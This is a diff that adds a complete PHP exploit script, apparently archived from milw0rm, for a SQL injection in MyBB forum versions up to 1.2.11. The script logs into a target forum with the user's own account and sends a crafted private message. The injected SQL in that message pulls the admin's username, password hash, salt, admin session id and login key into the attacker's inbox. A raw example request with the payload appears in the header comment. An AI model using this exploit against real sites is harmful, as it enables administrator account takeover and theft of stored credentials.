@@ -1,0 +1,160 @@
+<?php
+// forum mybb <= 1.2.11 remote sql injection vulnerability
+// bug found by Janek Vind "waraxe" http://www.waraxe.us/advisory-64.html
+// exploit write by c411k (not brutforce one symbol. insert hash in your PM in one action)
+//
+//		POST http://mybb.ru/forum/private.php HTTP/1.1
+//		Host: mybb.ru
+//		Cookie: mybbuser=138_4PN4Kn2BNaKOjo8ie4Yl2qadG77JTIeQyRoEAKgolr7uA55fZW
+//		Content-Type: application/x-www-form-urlencoded
+//		Content-Length: 479
+//		Connection: Close
+//
+//		to=c411k&message=co6ako_ykycuJIo&options[disablesmilies]=',null,null),(138,138,138,1,'with+<3+from+ru_antichat',9,concat_ws(0x3a,'username:password:salt+>',(select+username+from+mybb_users+where+uid=4),(select+password+from+mybb_users+where+uid=4),(select+salt+from+mybb_users+where+uid=4),admin_sid',(select+sid+from+mybb_adminsessions+where+uid=4),'admin_loginkey',(select+loginkey+from+mybb_adminsessions+where+uid=4)),1121512515,null,null,'yes',null,null)/*&action=do_send
+//	
+// greets all https://forum.antichat.ru  :)  b00zy/br 32sm. <====3 oO :P ( .)(. ) :D :| root@dblaine#cat /dev/legs > /dev/mouth
+// and http://expdb.cc/?op=expdb /welcome to our priv8 exploits shop, greetz to all it's members/*
+// 25.01.08
+
+error_reporting(0);
+@ini_set("max_execution_time",0);
+@ini_set('output_buffering',0);
+@set_magic_quotes_runtime(0);
+@set_time_limit(0);
+@ob_implicit_flush(1);
+
+header("Content-Type: text/html; charset=utf-8\r\n");
+header("Pragma: no-cache");
+
+?>
+
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title>mybb 1.2.11 xek</title>
+<style>
+<!--
+A:link {COLOR: #B9B9BD; TEXT-DECORATION: none}
+A:visited {COLOR: #B9B9BD; TEXT-DECORATION: none}
+A:active {COLOR: #228B22; TEXT-DECORATION: none}
+A:hover {COLOR: #E7E7EB; TEXT-DECORATION: underline}
+BODY
+{
+	margin="5";
+	FONT-WEIGHT: normal; 
+	COLOR: #B9B9BD; 
+	BACKGROUND: #44474F; 
+	FONT-FAMILY: Courier new, Courier, Verdana, Arial, Helvetica, sans-serif; 
+}
+
+-->
+</style>
+</head>
+<body>
+
+<?php
+
+function myflush($timee)
+{
+	if(ob_get_contents())
+	{
+		ob_flush();
+		ob_clean();
+		flush();
+		usleep($timee);
+	}
+}
+
+if (!$_GET)
+{
+	echo 
+	'<form action="'.$_SERVER['PHP_SELF'].'?fuck_mybb" method="post">
+	<input style="background-color: #31333B; color: #B9B9BD; border-color: #646C71;" type="submit" value="&#8194;get admin passwd...&#8194;"><br><br>
+	<input style="background-color: #31333B; color: #B9B9BD;" name="hostname" value="hostname">
+	<font color="#B9B9BD">&#8194;&#172; for expamle "expdb.cc"<br>
+	<input style="background-color: #31333B; color: #B9B9BD;" name="patch" value="patch">
+	<font color="#B9B9BD">&#8194;&#172; patch 2 mybb forum, for expamle "community/mybb"<br>
+	<input style="background-color: #31333B; color: #B9B9BD;" name="username" value="username">
+	<font color="#B9B9BD">&#8194;&#172; you username on this forum, for expamle "c411k"<br>
+	<input style="background-color: #31333B; color: #B9B9BD;" name="pwd" value="password">
+	<font color="#B9B9BD">&#8194;&#172; you password, for expamle "h1world"<br>
+	<input style="background-color: #31333B; color: #B9B9BD;" name="uid_needed" value="1">
+	<font color="#B9B9BD">&#8194;&#172; admin id, default 1<br>
+	</form>';
+}
+
+
+if (isset($_GET['fuck_mybb']))
+{
+$username = ($_POST['username']);
+$pwd = ($_POST['pwd']);
+$host_mybb = ($_POST['hostname']);
+$patch_mybb = ($_POST['patch']);
+$uid_needed = ($_POST['uid_needed']);
+$login_mybb = 'member.php';
+$pm_mybb = 'private.php';
+$data_login = 'username='.$username.'&password='.$pwd.'&submit=Login&action=do_login&url=http%3A%2F%2Flocalhost%2Fmybb_1210%2Findex.php';
+
+function sendd($host, $patch, $scr_nm, $method, $data_gp, $cook1e)
+{
+	global $send_http;
+	$s = array();
+	$url = fsockopen($host, 80);
+	$send_http  = "$method http://$host/$patch/$scr_nm HTTP/1.1\r\n";
+	$send_http .= "Host: $host\r\n";
+	$send_http .= "User-Agent: Mozilla/5.0 (oO; U; oO zzzz bzzzz brrr trrr; ru; rv:1.8.1.4) Gecko/20180515 Firefox/1.3.3.7\r\n";
+	$send_http .= "Cookie: $cook1e\r\n";
+	$send_http .= "Content-Type: application/x-www-form-urlencoded\r\n";
+	$send_http .= "Content-Length: ".strlen($data_gp)."\r\n";
+	$send_http .= "Connection: Close\r\n\r\n";
+	if ($method === 'POST')
+	{
+		$send_http .= $data_gp;
+	}
+	//print_r($send_http);
+	fputs($url, $send_http);
+	while (!feof($url)) $s[] = fgets($url, 1028);
+	fclose($url);
+	return $s;
+}
+
+echo '<pre>- start....';
+myflush(50000);
+
+$get_cookie = sendd($host_mybb, $patch_mybb, $login_mybb, 'POST', $data_login, 'fuckkk');
+echo '<pre>- login '.$username.' with passwd = '.$pwd.' done';
+myflush(50000);
+
+foreach ($get_cookie as $value)
+{
+	if (strpos($value, 'Set-Cookie: mybbuser=') !== false)
+	{
+		$value = explode(";", $value);
+		$cookie = strstr($value[0], 'mybbuser');
+		break;
+	}
+}
+echo '<pre>- cookie: '.$cookie;
+myflush(50000);
+
+preg_match("/mybbuser=(.*)_/", $cookie, $m);
+$get_uid = $m[1];
+echo '<pre>- user id: '.$get_uid;
+myflush(50000);
+
+$data_expl = "to=$username&message=co6ako_ykycuJIo&options[disablesmilies]=',null,null),($get_uid,$get_uid,$get_uid,1,'with+<3+from+antichat.ru',9,concat_ws(0x3a,'username:password:salt+>',(select+username+from+mybb_users+where+uid=$uid_needed),(select+password+from+mybb_users+where+uid=$uid_needed),(select+salt+from+mybb_users+where+uid=$uid_needed),' admin sid',(select+sid+from+mybb_adminsessions+where+uid=$uid_needed),' admin loginkey',(select+loginkey+from+mybb_adminsessions+where+uid=$uid_needed)),1121512515,null,null,'yes',null,null)/*&action=do_send";
+sendd($host_mybb, $patch_mybb, $pm_mybb, 'POST', $data_expl, $cookie);
+echo '<pre>- send exploit:
+-------------------
+'.$send_http.'
+-------------------
+look you private messages 4 admin passwd hash <a href=http://'.$host_mybb.'/'.$patch_mybb.'/'.$pm_mybb.' target=_blank>http://'.$host_mybb.'/'.$patch_mybb.'/'.$pm_mybb.'</a>';
+}
+
+
+?>
+
+</body>
+</html>
+
+# milw0rm.com [2008-08-26]
